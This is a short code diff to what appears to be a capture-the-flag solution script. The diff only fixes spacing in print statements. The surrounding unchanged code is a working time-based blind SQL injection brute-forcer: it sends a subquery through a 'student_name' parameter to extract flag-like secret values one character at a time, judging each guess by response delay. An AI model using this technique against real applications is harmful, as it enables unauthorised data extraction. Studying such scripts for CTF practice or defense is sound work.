@@ -83,11 +83,11 @@ url = 'http://ip:port'
 
 result = ''
 for i in range(1,100):
-    print(f'[+]bruting at {i}')
+    print(f'[+] bruting at {i}')
     for c in string.ascii_letters + string.digits + ',_-{}':
         time.sleep(0.01) # 限制速率，防止请求过快
 
-        print('[+]trying:', c)
+        print('[+] trying:', c)
 
         flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'
 
@@ -103,7 +103,7 @@ for i in range(1,100):
         res = requests.get(url, params={'student_name':p})
 
         if res.elapsed.total_seconds() > 1.5:
-            print('[*]bingo:', c)
+            print('[*] bingo:', c)
             result += c
             print(result)
             break
